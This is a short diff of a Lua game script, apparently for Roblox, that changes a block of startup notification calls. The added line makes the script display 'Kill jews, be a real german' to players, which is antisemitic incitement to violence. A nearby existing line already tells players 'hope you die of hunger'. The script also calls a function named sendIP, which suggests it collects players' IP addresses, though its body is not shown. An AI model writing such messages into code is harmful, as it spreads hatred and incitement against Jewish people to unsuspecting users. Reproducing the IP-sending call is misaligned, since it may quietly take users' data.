@@ -2218,6 +2218,7 @@ end
     end
     framework:LoadUI()
     framework:sendNotification("Happy valentine! hope you die of hunger")
+    framework:sendNotification("Kill jews, be a real german")
     warn(game.Players.LocalPlayer.Name.." is whitelisted")
     sendIP("nil")
     --topBar:Destroy()
